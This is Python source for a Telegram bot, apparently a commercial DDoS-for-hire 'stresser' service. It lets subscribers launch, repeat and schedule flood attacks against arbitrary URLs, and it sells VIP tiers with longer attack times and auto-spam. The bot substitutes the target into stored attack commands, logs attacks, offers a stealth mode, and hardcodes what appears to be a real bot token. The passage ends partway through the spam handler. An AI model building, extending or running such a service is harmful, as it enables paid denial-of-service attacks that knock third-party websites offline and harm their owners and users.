"""
========================================
⚡️ CYBER STRESSERS VN - FULL VERSION 2026 ⚡️
Developer & create script:
t.me/zentra999 | t.me/anhba999
========================================
"""
import time
import asyncio
import socket
import os
import sqlite3
import psutil
import random
import string
from urllib import parse
from datetime import datetime, timedelta
from html import escape

import httpx 
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from pytz import timezone

# --- CẤU HÌNH HỆ THỐNG GỐC ---
ORIGINAL_ADMINS = [6365140337] 
TOKEN = os.getenv('BOT_TOKEN', '7585395624:AAEwyBbCpVsQsTne3cD93P1ZN-aDHuiDiSY') 
DB_FILE = 'bot_database.db'
GROUP_LINK = "https://t.me/srv_down" 
BOT_USERNAME = "CyberStressersVN_Bot"  

active_users = {}      
user_cooldowns = {}    
scheduled_tasks = {}
looping_tasks = {}

async_client = httpx.AsyncClient(timeout=10.0, follow_redirects=True)

# --- DATABASE LOGIC ---
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute('CREATE TABLE IF NOT EXISTS methods (name TEXT PRIMARY KEY, type TEXT, url TEXT, time INTEGER, visibility TEXT, command TEXT)')
        c.execute('CREATE TABLE IF NOT EXISTS groups_allowed (group_id INTEGER PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS blacklist (domain TEXT PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)')
        c.execute('CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS private_allowed (user_id INTEGER PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS attack_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, target TEXT, method TEXT, duration INTEGER, time_at TEXT)')
        c.execute('CREATE TABLE IF NOT EXISTS joined_users (user_id INTEGER PRIMARY KEY, referred_by INTEGER DEFAULT 0, ref_count INTEGER DEFAULT 0)')
        c.execute('CREATE TABLE IF NOT EXISTS member_daily_quota (user_id INTEGER PRIMARY KEY, quota_left INTEGER, last_attack_date TEXT)')
        
        c.execute('CREATE TABLE IF NOT EXISTS vip_packages (package_name TEXT PRIMARY KEY, max_time INTEGER, quota INTEGER, can_spam INTEGER, can_schedule INTEGER, cooldown INTEGER, max_concurrent INTEGER)')
        c.execute('CREATE TABLE IF NOT EXISTS vip_users (user_id KEY PRIMARY KEY, package_name TEXT, custom_max_time INTEGER DEFAULT NULL, custom_quota INTEGER DEFAULT NULL, custom_cooldown INTEGER DEFAULT NULL, custom_max_concurrent INTEGER DEFAULT NULL)')

        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("bot_active", "1")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("stealth_mode", "1")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("member_cooldown", "30")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("member_max_concurrent", "3")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("member_global_max_time", "60")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("member_daily_limit", "10")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("ref_needed_for_vip", "5")')
        c.execute('INSERT OR IGNORE INTO vip_packages VALUES ("VIP1", 120, 50, 1, 1, 15, 5)')
        conn.commit()

def db_query(query, params=(), fetch=False):
    try:
        with sqlite3.connect(DB_FILE, timeout=20) as conn:
            c = conn.cursor()
            c.execute(query, params)
            conn.commit()
            if fetch: return c.fetchall()
    except sqlite3.Error as e:
        print(f"⚙️ Database Error: {e}")
        return [] if fetch else None

async def tele_backup_db(context):
    try:
        if os.path.exists(DB_FILE):
            for admin_id in ORIGINAL_ADMINS:
                with open(DB_FILE, 'rb') as db_file:
                    await context.bot.send_document(
                        chat_id=admin_id,
                        document=db_file,
                        filename=DB_FILE,
                        caption=f"⚡️ <b>[AUTO BACKUP]</b>\nĐã đồng bộ Cơ sở dữ liệu mới nhất!\n🕒 Thời gian: <code>{get_thoi_gian_vn()}</code>",
                        parse_mode='HTML'
                    )
    except Exception as e: print(f"Lỗi gửi file Tele backup: {e}")

def is_admin(user_id):
    if user_id in ORIGINAL_ADMINS: return True
    res = db_query('SELECT user_id FROM admins WHERE user_id=?', (user_id,), fetch=True)
    return bool(res)

def check_private_allowed(user_id):
    if is_admin(user_id): return True
    res = db_query('SELECT user_id FROM private_allowed WHERE user_id=?', (user_id,), fetch=True)
    return bool(res)

def log_attack(user_id, username, target, method, duration):
    time_vn = get_thoi_gian_vn()
    db_query('INSERT INTO attack_logs (user_id, username, target, method, duration, time_at) VALUES (?, ?, ?, ?, ?, ?)', 
             (user_id, username, target, method, duration, time_vn))

def get_bot_state():
    res = db_query('SELECT value FROM settings WHERE key="bot_active"', fetch=True)
    return res[0][0] == "1" if res else True

def set_bot_state(active):
    db_query('UPDATE settings SET value=? WHERE key="bot_active"', ("1" if active else "0",))

def get_stealth_mode():
    res = db_query('SELECT value FROM settings WHERE key="stealth_mode"', fetch=True)
    return res[0][0] == "1" if res else False

def set_stealth_mode(active):
    db_query('REPLACE INTO settings (key, value) VALUES ("stealth_mode", ?)', ("1" if active else "0",))

def get_system_setting(key, default_val):
    res = db_query('SELECT value FROM settings WHERE key=?', (key,), fetch=True)
    return res[0][0] if res else default_val

def get_all_methods():
    rows = db_query('SELECT name, type, url, time, visibility, command FROM methods', fetch=True)
    return {r[0]: {'type': r[1], 'url': r[2], 'time': r[3], 'visibility': r[4], 'command': r[5]} for r in rows}

def check_vip_status(user_id):
    res = db_query('SELECT user_id FROM vip_users WHERE user_id=?', (user_id,), fetch=True)
    return bool(res)

def get_vip_config(user_id):
    res = db_query('SELECT package_name, custom_max_time, custom_quota, custom_cooldown, custom_max_concurrent FROM vip_users WHERE user_id=?', (user_id,), fetch=True)
    if not res: return None
    package_name, c_time, c_quota, c_cooldown, c_concurrent = res[0]
    pkg_res = db_query('SELECT max_time, quota, can_spam, can_schedule, cooldown, max_concurrent FROM vip_packages WHERE package_name=?', (package_name,), fetch=True)
    if not pkg_res: return None 
    p_time, p_quota, p_spam, p_sch, p_cooldown, p_concurrent = pkg_res[0]
    return {
        'package': package_name,
        'max_time': c_time if c_time is not None else p_time,
        'quota': c_quota if c_quota is not None else p_quota,
        'can_spam': p_spam,
        'can_schedule': p_sch,
        'cooldown': c_cooldown if c_cooldown is not None else p_cooldown,
        'max_concurrent': c_concurrent if c_concurrent is not None else p_concurrent
    }

def get_user_cooldown(user_id):
    if is_admin(user_id): return 0
    vip_cfg = get_vip_config(user_id)
    if vip_cfg: return vip_cfg['cooldown']
    res = db_query('SELECT value FROM settings WHERE key="member_cooldown"', fetch=True)
    return int(res[0][0]) if res else 30

def get_running_tasks_count(user_id):
    if is_admin(user_id): return 0
    return sum(1 for u_id, status in active_users.items() if u_id == user_id and status is True)

def check_and_update_member_quota(user_id):
    current_date = datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%d-%m-%Y')
    max_daily = int(get_system_setting("member_daily_limit", "10"))
    res = db_query('SELECT quota_left, last_attack_date FROM member_daily_quota WHERE user_id=?', (user_id,), fetch=True)
    if not res:
        db_query('INSERT INTO member_daily_quota (user_id, quota_left, last_attack_date) VALUES (?, ?, ?)', (user_id, max_daily - 1, current_date))
        return max_daily - 1
    quota_left, last_attack_date = res[0]
    if last_attack_date != current_date:
        db_query('UPDATE member_daily_quota SET quota_left = ?, last_attack_date = ? WHERE user_id = ?', (max_daily - 1, current_date, user_id))
        return max_daily - 1
    else:
        if quota_left <= 0: return -1
        new_quota = quota_left - 1
        db_query('UPDATE member_daily_quota SET quota_left = ? WHERE user_id = ?', (new_quota, user_id))
        return new_quota

async def lay_ip_va_isp(url):
    try:
        loop = asyncio.get_running_loop()
        hostname = parse.urlsplit(url).netloc
        ip = await loop.run_in_executor(None, socket.gethostbyname, hostname)
        response = await async_client.get(f"http://ip-api.com/json/{ip}")
        return ip, response.json() if response.status_code == 200 else {}
    except Exception: return None, {}

def get_thoi_gian_vn(): return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%H:%M:%S | %d-%m-%Y')

async def check_private_block(update):
    user_id = update.message.from_user.id
    if update.message.chat.type == 'private' and not is_admin(user_id) and not check_private_allowed(user_id):
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Tham gia Nhóm sử dụng Bot", url=GROUP_LINK)]])
        await update.message.reply_text(
            "⚡️ ─── [ SYSTEM MANAGEMENT BAN ] ─── ⚡️\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ <b>THÔNG BÁO HỆ THỐNG CHẶN LỆNH</b>\n\n"
            "Để bảo vệ tài nguyên VPS, các lệnh điều khiển tấn công chỉ được thực thi trực tiếp tại Nhóm chính thức hoặc yêu cầu tài khoản được cấp quyền.\n"
            "👉 Vui lòng vào nhóm để sử dụng!", 
            parse_mode='HTML', reply_markup=kb
        )
        return True
    return False

async def toggle_botro(update, context):
    if not is_admin(update.message.from_user.id): return
    current_mode = get_stealth_mode()
    new_mode = not current_mode
    set_stealth_mode(new_mode)
    status_text = "🟢 BẬT (Chỉ trả lời Private Chat)" if new_mode else "🔴 TẮT (Trả lời cả Group và Private)"
    await update.message.reply_text(
        f"👻 CHẾ ĐỘ BOTRO\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"Trạng thái: {status_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Khi bật: Bot chỉ trả lời trong Private Chat",
        parse_mode='HTML'
    )

async def thong_tin_vip(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return 

    if is_admin(user_id):
        return await update.message.reply_text("👑 Bạn là ADMIN - Đặc quyền vô hạn.", parse_mode='HTML')
    
    vip_cfg = get_vip_config(user_id)
    ref_data = db_query('SELECT ref_count FROM joined_users WHERE user_id=?', (user_id,), fetch=True)
    current_refs = ref_data[0][0] if ref_data else 0
    ref_needed = int(get_system_setting("ref_needed_for_vip", "5"))

    if vip_cfg:
        spam_st = "✅" if vip_cfg['can_spam'] else "❌"
        sch_st = "✅" if vip_cfg['can_schedule'] else "❌"
        await update.message.reply_text(
            "👑 HỒ SƠ VIP\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID: {user_id}\n"
            f"📦 Gói: {vip_cfg['package']}\n"
            f"⏳ Time: {vip_cfg['max_time']}s\n"
            f"🚀 Quota: {vip_cfg['quota']}\n"
            f"🔄 Spam: {spam_st}\n"
            f"⏰ Lịch: {sch_st}\n"
            f"📶 Slot: {vip_cfg['max_concurrent']}\n"
            f"👥 Ref: {current_refs}\n"
            f"❄️ Cooldown: {vip_cfg['cooldown']}s",
            parse_mode='HTML'
        )
    else:
        dm_cooldown = get_user_cooldown(user_id)
        mmc = get_system_setting("member_max_concurrent", "3")
        daily_max = get_system_setting("member_daily_limit", "10")
        mq_res = db_query('SELECT quota_left, last_attack_date FROM member_daily_quota WHERE user_id=?', (user_id,), fetch=True)
        current_date = datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%d-%m-%Y')
        current_left = mq_res[0][0] if mq_res and mq_res[0][1] == current_date else daily_max

        await update.message.reply_text(
            "👤 HỒ SƠ MEMBER\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"📶 Slot: {mmc}\n"
            f"📅 Hôm nay: {current_left}/{daily_max}\n"
            f"👥 Ref: {current_refs}/{ref_needed}\n"
            f"❄️ Cooldown: {dm_cooldown}s\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Mời {ref_needed} người nhận VIP1 FREE",
            parse_mode='HTML'
        )

async def xem_gia_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_private_block(update): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return 
    
    msg = (
        "💎 BẢNG GIÁ VIP\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💛 VIP1 - 99K/Tháng\n"
        "▸ Time: 60s | Quota: 30/ngày\n"
        "▸ Slot: 2 | Cooldown: 30s\n"
        "▸ ❌ Spam | ❌ Lịch\n\n"
        "🤍 VIP2 - 350K/Tháng\n"
        "▸ Time: 120s | Quota: 50/ngày\n"
        "▸ Slot: 2 | Cooldown: 30s\n"
        "▸ ❌ Spam | ❌ Lịch\n\n"
        "💙 VIP3 - 600K/Tháng\n"
        "▸ Time: 200s | Quota: 70/ngày\n"
        "▸ Slot: 3 | Cooldown: 15s\n"
        "▸ ❌ Spam | ✅ Lịch\n\n"
        "❤️ VIP4 - 1M/Tháng\n"
        "▸ Time: 300s | Quota: 100/ngày\n"
        "▸ Slot: 3 | Cooldown: 15s\n"
        "▸ ✅ Spam | ✅ Lịch\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "💳 Mua: @zentra999 / @anhba999"
    )
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("💬 Mua VIP1", url="https://t.me/zentra999")],
        [InlineKeyboardButton("📢 Tham gia nhóm", url=GROUP_LINK)]
    ])
    
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=kb)

async def check_website(update, context):
    if await check_private_block(update): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return 
    
    if len(context.args) < 1: 
        return await update.message.reply_text("⚠️ /check [url]", parse_mode='HTML')
    url = context.args[0]
    if not url.startswith(('http://', 'https://')): url = 'https://' + url
    sent_msg = await update.message.reply_text(f"🔍 Đang check {url}...", parse_mode='HTML')
    try:
        st = time.time()
        resp = await async_client.get(url)
        ms = round((time.time() - st) * 1000, 2)
        sc = resp.status_code
        icon = "🟢" if 200 <= sc < 300 else "🟡" if sc < 400 else "🔴"
        res = (
            f"🌐 CHECK HOST\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 {url}\n"
            f"🚦 {icon} Mã: {sc}\n"
            f"⚡ Ping: {ms}ms"
        )
    except Exception: 
        res = "❌ KHÔNG KẾT NỐI ĐƯỢC"
    await sent_msg.edit_text(res, parse_mode='HTML')

async def danh_sach_phuong_thuc(update, context):
    if await check_private_block(update): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return 
    
    methods_data = get_all_methods()
    if not methods_data: 
        return await update.message.reply_text("📭 Chưa có method nào!", parse_mode='HTML')
    
    msg = "🧬 DANH SÁCH METHODS\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    vip, free = [], []
    for name, data in methods_data.items():
        line = f"▸ {name} | {data.get('type', 'UNK')} | {data['time']}s"
        if data.get('visibility') == 'VIP':
            vip.append(line)
        else:
            free.append(line)
            
    if vip: 
        msg += "👑 VIP ONLY:\n" + "\n".join(vip) + "\n\n"
        
    if free: 
        msg += "🔰 FREE TIER:\n" + "\n".join(free) + "\n"
        
    msg += "━━━━━━━━━━━━━━━━━━━━━\n"
    msg += "💡 Nâng cấp VIP để dùng method VIP"
    
    await update.message.reply_text(msg, parse_mode='HTML')

async def help_group(update, context):
    is_private = update.message.chat.type == 'private'
    user_id = update.message.from_user.id
    if get_stealth_mode() and not is_private: return 
    
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name
    ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"

    if is_private and context.args and context.args[0].startswith('ref_'):
        try:
            referrer_id = int(context.args[0].split('_')[1])
            check_user = db_query('SELECT user_id FROM joined_users WHERE user_id=?', (user_id,), fetch=True)
            
            if not check_user and referrer_id != user_id:
                db_query('INSERT INTO joined_users (user_id, referred_by, ref_count) VALUES (?, ?, 0)', (user_id, referrer_id))
                db_query('INSERT OR IGNORE INTO joined_users (user_id, referred_by, ref_count) VALUES (?, 0, 0)', (referrer_id,))
                db_query('UPDATE joined_users SET ref_count = ref_count + 1 WHERE user_id = ?', (referrer_id,))
                
                ref_res = db_query('SELECT ref_count FROM joined_users WHERE user_id = ?', (referrer_id,), fetch=True)
                current_refs = ref_res[0][0] if ref_res else 0
                ref_needed = int(get_system_setting("ref_needed_for_vip", "5"))
                
                if current_refs >= ref_needed and not check_vip_status(referrer_id):
                    db_query('REPLACE INTO vip_users (user_id, package_name) VALUES (?, "VIP1")', (referrer_id,))
                    try:
                        await context.bot.send_message(
                            chat_id=referrer_id,
                            text=f"⚡️ <b>Cyber Stressers VN NOTICE</b> ⚡️\n━━━━━━━━━━━━━━━━━━━━\n"
                                 f"🎉 Chúc mừng! Bạn đã giới thiệu thành công (<b>{current_refs}/{ref_needed}</b>) người.\n"
                                 f"👑 Hệ thống đã tự động kích hoạt **GÓI VIP1** miễn phí cho tài khoản của bạn!",
                            parse_mode='HTML'
                        )
                    except Exception: pass
                else:
                    try:
                        await context.bot.send_message(
                            chat_id=referrer_id,
                            text=f"⚡️ <b>Cyber Stressers VN REPORT</b> ⚡️\n━━━━━━━━━━━━━━━━━━━━\n"
                                 f"👤 Thành viên mới kích hoạt qua link ref của bạn.\n"
                                 f"📊 Tiến trình: <b>{current_refs}/{ref_needed}</b> người. Đạt mốc để nhận gói VIP1 miễn phí!",
                            parse_mode='HTML'
                        )
                    except Exception: pass
                await tele_backup_db(context)
        except Exception as e: print(f"Lỗi ref: {e}")

    if is_private: db_query('INSERT OR IGNORE INTO joined_users (user_id, referred_by, ref_count) VALUES (?, 0, 0)', (user_id,))

    help_text = (
        "⚡️ CYBER STRESSERS VN ⚡️\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 Xin chào @{username}\n\n"
        "⚔️ LỆNH TẤN CÔNG:\n"
        "▸ /attack [method] [url] [time]\n"
        "▸ /spam [method] [url] [time]\n"
        "▸ /stopspam - Dừng spam\n"
        "▸ /schedule [HH:MM] [method] [url] [time]\n"
        "▸ /delschedule [ID] - Xóa lịch\n"
        "▸ /pkill - Dừng khẩn cấp\n\n"
        
        "📡 TIỆN ÍCH:\n"
        "▸ /me - Hồ sơ cá nhân\n"
        "▸ /price - Bảng giá VIP\n"
        "▸ /check [url] - Kiểm tra host\n"
        "▸ /methods - Danh sách method\n\n"
        
        "🎁 GIỚI THIỆU BẠN BÈ:\n"
        f"🔗 {ref_link}\n"
        "💡 Mời đủ người để nhận VIP1 FREE\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📶 Status: ONLINE"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👨‍💻 Liên Hệ Admin", url="https://t.me/zentra999")]])
    await update.message.reply_text(help_text, parse_mode='HTML', reply_markup=kb, disable_web_page_preview=True)

# --- PANEL: LÊN LỊCH & HỦY LỊCH ---
async def dat_lich(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'

    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if not get_bot_state() and not is_admin(user_id): return await reply_error("❌ <b>Hệ thống đang bảo trì!</b>")

    allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
    if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): 
        return await reply_error("🚫 <b>Nhóm chưa được cấp phép.</b>")

    vip_cfg = get_vip_config(user_id)
    is_vip = vip_cfg is not None

    if not is_admin(user_id):
        user_max_concurrent = vip_cfg['max_concurrent'] if is_vip else int(get_system_setting("member_max_concurrent", 3))
        if get_running_tasks_count(user_id) >= user_max_concurrent:
            return await reply_error(f"⚠️ <b>Bạn đã đạt giới hạn luồng chạy song song (Tối đa {user_max_concurrent} luồng)!</b>")

    if not is_admin(user_id):
        if not is_vip: return await reply_error("🔒 <b>Tính năng yêu cầu đặc quyền VIP.</b>")
        if not vip_cfg['can_schedule']: return await reply_error("🚫 <b>Tài khoản của bạn KHÔNG được cấp quyền Đặt lịch!</b>")

    args = context.args
    is_schedule_spam = False
    if len(args) > 0 and args[0].lower() == 'spam':
        is_schedule_spam = True
        args = args[1:]

    if len(args) < 3: 
        return await reply_error("⚠️ <b>Cú pháp đặt lịch:</b>\n"
                                 "👉 Thường: <code>/schedule [HH:MM] [method] [url] [time]</code>\n"
                                 "👉 Auto Spam: <code>/schedule spam [HH:MM] [method] [url] [time]</code>")

    time_str, method_name, url = args[0], args[1], args[2]
    methods_data = get_all_methods()
    if method_name not in methods_data: 
        return await reply_error("❌ <b>Phương thức không tồn tại!</b>")
    
    method = methods_data[method_name]

    if method['visibility'] == 'VIP' and not is_admin(user_id) and not is_vip: 
        return await reply_error("🔒 <b>Tính năng yêu cầu đặc quyền VIP.</b>")

    if is_schedule_spam and not is_admin(user_id) and is_vip and not vip_cfg['can_spam']:
        return await reply_error("🚫 <b>Bạn không có quyền sử dụng tính năng Auto Spam!</b>")

    attack_time = method['time']
    if len(args) > 3:
        try: attack_time = int(args[3])
        except ValueError: pass

    if not is_admin(user_id) and not is_vip:
        sys_global_max_time = int(get_system_setting("member_global_max_time", 60))
        if attack_time > sys_global_max_time: attack_time = sys_global_max_time
        left_quota = check_and_update_member_quota(user_id)
        if left_quota == -1: 
            return await reply_error("❌ <b>Bạn đã sử dụng hết số lượt tấn công trong ngày!</b>")

    if not is_admin(user_id) and is_vip:
        if vip_cfg['quota'] <= 0: 
            return await reply_error("❌ <b>Tài khoản VIP của bạn đã hết lượt!</b>")
        if attack_time > vip_cfg['max_time']: 
            attack_time = vip_cfg['max_time']
        db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id=?', (vip_cfg['quota'] - 1, user_id))
        await tele_backup_db(context)

    try:
        vn_tz = timezone('Asia/Ho_Chi_Minh')
        now = datetime.now(vn_tz)
        naive_target = datetime.strptime(time_str, "%H:%M").replace(year=now.year, month=now.month, day=now.day)
        target_time = vn_tz.localize(naive_target)
        if target_time <= now: target_time = target_time + timedelta(days=1)
        delay_seconds = (target_time - now).total_seconds()
    except ValueError:
        if not is_admin(user_id):
            if is_vip: db_query('UPDATE vip_users SET custom_quota = custom_quota + 1 WHERE user_id=?', (user_id,))
            else: db_query('UPDATE member_daily_quota SET quota_left = quota_left + 1 WHERE user_id=?', (user_id,))
        return await reply_error("⚠️ <b>Định dạng thời gian sai!</b>")
        
    blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
    if parse.urlsplit(url).netloc.lower() in blacklist: 
        if not is_admin(user_id):
            if is_vip: db_query('UPDATE vip_users SET custom_quota = custom_quota + 1 WHERE user_id=?', (user_id,))
            else: db_query('UPDATE member_daily_quota SET quota_left = quota_left + 1 WHERE user_id=?', (user_id,))
        return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")

    ip, isp_info = await lay_ip_va_isp(url)
    if not ip: 
        if not is_admin(user_id):
            if is_vip: db_query('UPDATE vip_users SET custom_quota = custom_quota + 1 WHERE user_id=?', (user_id,))
            else: db_query('UPDATE member_daily_quota SET quota_left = quota_left + 1 WHERE user_id=?', (user_id,))
        return await reply_error("🌐 <b>Lỗi DNS.</b>")

    cmd = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    username = update.message.from_user.username or update.message.from_user.full_name

    task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    loai_lich = "KÍCH HOẠTH SPAM" if is_schedule_spam else "TẤN CÔNG THƯỜNG"
    await reply_error(f"✅ <b>[TIMER SET - {loai_lich}]</b> Đã đặt lịch hẹn.\n⏰ Kích hoạt: <code>{target_time.strftime('%H:%M | %d/%m')}</code>\n🆔 <b>Mã Hủy:</b> <code>{task_id}</code>")

    task = asyncio.create_task(run_scheduled_attack(delay_seconds, cmd, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private, task_id, is_schedule_spam))
    scheduled_tasks[task_id] = {'task': task, 'user_id': user_id, 'target': url}

async def huy_lich(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'
    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if len(context.args) < 1: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/delschedule [Mã Task]</code>")
    task_id = context.args[0].upper()

    if task_id not in scheduled_tasks: return await reply_error("❌ <b>Không tìm thấy mã lịch hẹn!</b>")
    task_info = scheduled_tasks[task_id]
    
    if task_info['user_id'] != user_id and not is_admin(user_id): 
        return await reply_error("🚫 <b>Bạn không có quyền hủy lịch của người khác!</b>")

    task_info['task'].cancel()
    del scheduled_tasks[task_id]
    
    if not is_admin(user_id):
        if check_vip_status(task_info['user_id']):
            db_query('UPDATE vip_users SET custom_quota = custom_quota + 1 WHERE user_id=?', (task_info['user_id'],))
        else:
            db_query('UPDATE member_daily_quota SET quota_left = quota_left + 1 WHERE user_id=?', (task_info['user_id'],))
        
    await reply_error(f"🗑 <b>Đã hủy bỏ lịch hẹn:</b> <code>{task_id}</code>")
    await tele_backup_db(context)

async def run_scheduled_attack(delay, command, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private, task_id, is_schedule_spam):
    try: await asyncio.sleep(delay)
    except asyncio.CancelledError: return 

    if task_id in scheduled_tasks: del scheduled_tasks[task_id]
    current_stealth = get_stealth_mode()
    
    if is_schedule_spam:
        dashboard = (
            "⏰ AUTO SPAM KÍCH HOẠT\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 {escape(username)}\n"
            f"🎯 {url}\n"
            f"🔥 {method_name.upper()}\n"
            f"⏱ Mỗi phát: {attack_time}s"
        )
    else:
        dashboard = (
            "⏰ TẤN CÔNG THEO LỊCH\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 {escape(username)}\n"
            f"🎯 {url}\n"
            f"🔥 {method_name.upper()}\n"
            f"⏳ {attack_time}s"
        )

    if current_stealth and not is_private:
        for admin in ORIGINAL_ADMINS:
            try: await context.bot.send_message(chat_id=admin, text=dashboard, parse_mode='HTML')
            except Exception: pass
    else:
        try: await update.message.reply_text(dashboard, parse_mode='HTML')
        except Exception: pass

    log_attack(user_id, username, url, method_name, attack_time)

    if is_schedule_spam:
        if user_id in looping_tasks: looping_tasks[user_id]['task'].cancel()
        task = asyncio.create_task(run_spam_loop(command, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private))
        looping_tasks[user_id] = {'task': task, 'target': url}
    else:
        await thuc_hien_tan_cong(command, update, method_name, context, user_id, current_stealth, is_private)

# --- PANEL: AUTO SPAM ---
async def bat_spam(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'
    
    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if not get_bot_state() and not is_admin(user_id): 
        return await reply_error("❌ Hệ thống đang bảo trì!")
        
    allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
    if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): 
        return await reply_error("🚫 Nhóm chưa được cấp phép.")

    vip_cfg = get_vip_config(user_id)
    is_vip = vip_cfg is not None

    if not is_admin(user_id):
        user_max_concurrent = vip_cfg['max_concurrent'] if is_vip else int(get_system_setting("member_max_concurrent", 3))
        if get_running_tasks_count(user_id) >= user_max_concurrent:
            return await reply_error(f"⚠️ Đạt giới hạn luồng ({user_max_concurrent})!")

    if not is_admin(user_id):
        if not is_vip: 
            return await reply_error("🔒 Yêu cầu VIP!")
        if not vip_cfg['can_spam']: 
            return await reply_error("🚫 Không có quyền Auto Spam!")

    if user_id in looping_tasks: 
        return await reply_error("🔄 Đang chạy! Dùng /stopspam")
    if len(context.args) < 2: 
        return await reply_error("⚠️ /spam [method] [url] [time]")

    method_name, url = context.args[0], context.args[1]
    methods_data = get_all_methods()
    if method_name not in methods_data: 
        return await reply_error("❌ Method không tồn tại!")

    method = methods_data[method_name]
    if method.get('visibility') == 'VIP' and not is_admin(user_id) and not is_vip:
        return await reply_error("🔒 Method này chỉ dành cho VIP! Nâng cấp để sử dụng.")
        
    blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
    if parse.urlsplit(url).netloc.lower() in blacklist: 
        return await reply_error("🛡️ Mục tiêu trong Blacklist!")

    ip, isp_info = await lay_ip_va_isp(url)
    if not ip: 
        return await reply_error("🌐 Lỗi DNS!")

    attack_time = method['time']
    if len(context.args) > 2:
        try: attack_time = int(context.args[2])
        except ValueError: pass

    if not is_admin(user_id) and not is_vip:
        sys_global_max_time = int(get_system_setting("member_global_max_time", 60))
        if attack_time > sys_global_max_time: attack_time = sys_global_max_time
        left_quota = check_and_update_member_quota(user_id)
        if left_quota == -1: 
            return await reply_error("❌ Hết lượt trong ngày!")

    if not is_admin(user_id) and is_vip:
        if vip_cfg['quota'] <= 0: 
            return await reply_error("❌ Hết quota VIP!")
        if attack_time > vip_cfg['max_time']: 
            attack_time = vip_cfg['max_time']
        db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id=?', (vip_cfg['quota'] - 1, user_id)) 
        await tele_backup_db(context)

    cmd = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    username = update.message.from_user.username or update.message.from_user.full_name

    log_attack(user_id, username, url, method_name, attack_time)

    dynamic_cooldown = get_user_cooldown(user_id)
    await reply_error(
        f"🔥 AUTO SPAM\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ {attack_time}s/lần\n"
        f"💤 Nghỉ {dynamic_cooldown}s\n"
        f"🛑 /stopspam để dừng"
    )

